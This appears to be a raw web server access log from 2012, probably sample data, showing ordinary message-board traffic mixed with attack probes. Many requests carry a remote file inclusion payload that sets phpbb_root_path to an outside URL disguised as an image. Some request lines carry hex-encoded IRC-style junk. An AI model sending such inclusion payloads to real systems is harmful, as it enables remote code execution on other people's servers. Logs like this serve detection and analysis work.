aaa
127.0.0.1 - - [03/May/2012:00:00:00 +0900] "GET /?name=Forums&amp%3bfile=faq//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:00:06 +0900] "GET /?name=Forums&amp%3bfile=faq//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:00:08 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:00:10 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:00:12 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:00:14 +0900] "GET %4a%4f%49%4e%20%23%21%72%61%70%21%20%72%30%30%74%65%64%0d%0a/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2382 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:00:18 +0900] "GET %4a%4f%49%4e%20%23%73%20%a4%a4%a4%a4%0d%0a/rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&bd_num=2064 HTTP/1.1" 200 210
211.39.150.195 - - [03/May/2012:00:01:22 +0900] "GET %4a%4f%49%4e%20%26%76%69%72%74%75%0a/rg4_board/view.php?bbs_code=&bd_num=3727&year=2860&month=4 HTTP/1.1" 200 235
211.39.150.195 - - [03/May/2012:00:01:38 +0900] "GET %4a%4f%49%4e%20%23%61%72%6d%79%23%20%64%61%64%61%0d%0a/rg4_board/write.php?&bbs_code=class_free&page=1&bd_num=2694&mode=delete HTTP/1.1" 200 205
127.0.0.1 - - [03/May/2012:00:01:50 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:01:52 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:01:54 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
66.249.69.170 - - [03/May/2012:00:02:01 +0900] "GET %30%32%20%30%2e%35%30%42%0a/rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&bd_num=2065 HTTP/1.1" 200 210
127.0.0.1 - - [03/May/2012:00:02:44 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:02:51 +0900] "GET %00%6f%63%74%65%74%00/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2384 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:03:23 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:03:43 +0900] "GET %32%32%30%20%53%74%6e%79%46%74%70%64%20%30%77%6e%73%20%6a%30%0a/rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&bd_num=2075 HTTP/1.1" 200 210
124.2.44.105 - - [03/May/2012:00:03:45 +0900] "GET %4a%4f%49%4e%20%23%21%77%6f%77%21%20%0d%0a/robots.txt HTTP/1.0" 404 302
211.39.150.195 - - [03/May/2012:00:03:43 +0900] "GET %80%80%dd%40%b0%0a%08%0c%2d%8d%f4%0c%cd%2c%f4%0c%f5/rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2861&month=1 HTTP/1.1" 200 40896
127.0.0.1 - - [03/May/2012:00:03:49 +0900] "GET /?name=ClanList//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:03:45 +0900] "GET %4a%4f%49%4e%20%23%23%6a%65%77%62%61%67%67%20/rg4_board/view.php?bbs_code=action&bd_num=945 HTTP/1.0" 200 65556
127.0.0.1 - - [03/May/2012:00:03:50 +0900] "GET /?name=ClanList//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:03:51 +0900] "GET /?name=ClanList//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:04:05 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:04:07 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:04:08 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:05:25 +0900] "GET %4a%4f%49%4e%20%23%77%69%73%68%20%0d%0a/rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&bd_num=2076 HTTP/1.1" 200 210
124.2.44.105 - - [03/May/2012:00:06:44 +0900] "GET %4a%4f%49%4e%20%23%5a%59%62%6f%74%20%61%35%37%38%38%31%31%31%0d/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2388 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:00:06:59 +0900] "GET %4f%49%4e%20%23%62%69%6c%6c%23%20%0d%0a/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2391 HTTP/1.0" 200 206
61.247.204.37 - - [03/May/2012:00:06:58 +0900] "GET %4a%4f%49%4e%20%23%23%23%23%20%02%02%02%02%0d%0a/rg4_board/down.php?bbs_code=management&bd_num=3332&key=0&mode=down HTTP/1.1" 200 96768
127.0.0.1 - - [03/May/2012:00:07:01 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:03 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:05 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:05 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:06 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:07 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:07 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:07:07 +0900] "GET %4a%4f%49%4e%20%23%61%23%20%73%61%61%64%2e%0d%0a/rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&bd_num=2334 HTTP/1.1" 200 210
127.0.0.1 - - [03/May/2012:00:07:09 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:09 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:10 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:10 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:11 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:11 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:12 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:13 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:18 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:19 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:21 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:22 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:23 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:25 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:40 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:43 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:44 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:47 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:52 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:07:54 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:08:06 +0900] "GET %4a%4f%49%4e%20%23%2e%6d%61%70%78%20%79%65%6c%6c%6f%77%0d%0a/rg4_board/write.php?&bbs_code=class_free&page=1&bd_num=2694&mode=reply HTTP/1.1" 200 205
61.247.204.39 - - [03/May/2012:00:08:27 +0900] "GET %4a%4f%49%4e%20%23%6e%65%67%65%72%72%65%70%74%69%65%6c%20%72%30/rg4_board/view.php?bbs_code=open_4&bd_num=318&page=3 HTTP/1.1" 200 27548
127.0.0.1 - - [03/May/2012:00:08:47 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:08:50 +0900] "GET %98%d0%ff%6b%12%a1%10%36%98%33%46%c3%f8%7e%34%5a/rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2322 HTTP/1.1" 200 217
127.0.0.1 - - [03/May/2012:00:08:52 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:08:58 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:08:58 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:09:01 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:09:02 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:09:10 +0900] "GET %4A%4F%49%4E%20%23%23%66%69%6E%61%6C%32/main/index.php?bbs_code=schedule&month=10&year=2864 HTTP/1.1" 200 33139
127.0.0.1 - - [03/May/2012:00:09:45 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:09:46 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:09:48 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:09:49 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:09:51 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:09:53 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:10:01 +0900] "GET %4A%4F%49%4E%20%23%23%66%69%6E%61%6C/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2393 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:10:14 +0900] "GET %4A%4F%49%4E%20%23%62%61%63%6B/rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D7%26year%3D2864 HTTP/1.1" 200 10469
211.39.150.195 - - [03/May/2012:00:10:32 +0900] "GET %4A%4F%49%4E%20%23%78%44%78/rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2323 HTTP/1.1" 200 217
127.0.0.1 - - [03/May/2012:00:10:41 +0900] "GET /?name=Your_Account//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:10:51 +0900] "GET /?name=Your_Account//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:10:53 +0900] "GET /?name=Your_Account//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:13 +0900] "GET /?name=Profile//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:11:15 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D5%26year%3D2862 HTTP/1.1" 200 10469
127.0.0.1 - - [03/May/2012:00:11:17 +0900] "GET /?name=Profile//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:19 +0900] "GET /?name=Profile//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:31 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:32 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:33 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:34 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:34 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:36 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.37 - - [03/May/2012:00:11:34 +0900] "GET %4A%4F%49%4E%20%23%76%65%63/rg4_board/view.php?bbs_code=open_7&bd_num=2247&page=6 HTTP/1.1" 200 67218
61.247.204.37 - - [03/May/2012:00:11:49 +0900] "GET User-Agent: InetURL:/1.0/rg4_board/slide.php?bbs_code=action&page=4 HTTP/1.1" 404 311
127.0.0.1 - - [03/May/2012:00:11:51 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:53 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:57 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:11:58 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:12:00 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:12:02 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:12:18 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2325 HTTP/1.1" 200 217
211.39.150.195 - - [03/May/2012:00:12:19 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D6%26year%3D2863 HTTP/1.1" 200 10469
127.0.0.1 - - [03/May/2012:00:13:19 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:13:20 +0900] "GET /?name=Profile//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:13:21 +0900] "GET /?name=Profile//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:13:19 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D9%26year%3D2863 HTTP/1.1" 200 10469
127.0.0.1 - - [03/May/2012:00:13:23 +0900] "GET /?name=Profile//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:13:24 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:13:25 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:13:27 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:13:51 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2397 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:13:49 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:13:52 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:13:54 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:13:57 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2326 HTTP/1.1" 200 217
127.0.0.1 - - [03/May/2012:00:14:14 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:14:16 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:14:17 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:14:20 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D3%26year%3D2862 HTTP/1.1" 200 10469
127.0.0.1 - - [03/May/2012:00:14:23 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:14:28 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:14:34 +0900] "GET /rg4_board/write.php?&bbs_code=class_free&page=1&bd_num=2709&mode=reply HTTP/1.1" 200 205
127.0.0.1 - - [03/May/2012:00:14:36 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:14:38 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:14:39 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:14:41 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:14:43 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:14:45 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:15:20 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:15:21 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:15:23 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D10%26year%3D2863 HTTP/1.1" 200 10469
127.0.0.1 - - [03/May/2012:00:15:23 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.39 - - [03/May/2012:00:15:30 +0900] "GET /rg4_board/down.php?bbs_code=study+data&bd_num=1166&key=0&mode=down HTTP/1.1" 200 331162
127.0.0.1 - - [03/May/2012:00:15:35 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:15:36 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:15:40 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2327 HTTP/1.1" 200 217
127.0.0.1 - - [03/May/2012:00:15:44 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:16:07 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
61.247.204.35 - - [03/May/2012:00:16:11 +0900] "GET /rg4_board/down.php?bbs_code=open_1&bd_num=2643&key=1&mode=down&page=3 HTTP/1.1" 200 1825792
124.2.44.105 - - [03/May/2012:00:16:23 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2401 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:16:26 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:16:27 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:16:28 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2402 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:16:24 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D11%26year%3D2862 HTTP/1.1" 200 10469
127.0.0.1 - - [03/May/2012:00:16:30 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:16:49 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:16:51 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:16:52 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:16:53 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:16:56 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:16:57 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.38 - - [03/May/2012:00:17:20 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=894&page=8 HTTP/1.1" 200 27747
211.39.150.195 - - [03/May/2012:00:17:23 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2328 HTTP/1.1" 200 217
211.39.150.195 - - [03/May/2012:00:17:25 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D12%26year%3D2861 HTTP/1.1" 200 10469
211.39.150.195 - - [03/May/2012:00:18:29 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2860&month=1 HTTP/1.1" 200 235
211.39.150.195 - - [03/May/2012:00:19:05 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2329 HTTP/1.1" 200 217
211.39.150.195 - - [03/May/2012:00:19:29 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2862&month=10 HTTP/1.1" 200 235
61.247.204.39 - - [03/May/2012:00:20:11 +0900] "GET /rg4_board/down.php?bbs_code=open_1&bd_num=1347&key=0&mode=down&page=4 HTTP/1.1" 200 40960
124.2.44.105 - - [03/May/2012:00:20:22 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2405 HTTP/1.0" 200 206
61.247.204.39 - - [03/May/2012:00:20:21 +0900] "GET /rg4_board/down.php?bbs_code=open_1&bd_num=1527&key=0&mode=down&page=3 HTTP/1.1" 200 276992
61.247.204.38 - - [03/May/2012:00:20:31 +0900] "GET /rg4_board/view.php?bbs_code=open_6&bd_num=2079&page=2 HTTP/1.1" 200 27814
211.39.150.195 - - [03/May/2012:00:20:33 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2862&month=5 HTTP/1.1" 200 41229
211.39.150.195 - - [03/May/2012:00:20:48 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2331 HTTP/1.1" 200 217
211.39.150.195 - - [03/May/2012:00:21:02 +0900] "GET /rg4_board/write.php?&bbs_code=class_free&page=1&bd_num=3197&mode=delete HTTP/1.1" 200 205
124.2.44.105 - - [03/May/2012:00:21:15 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2410 HTTP/1.0" 200 206
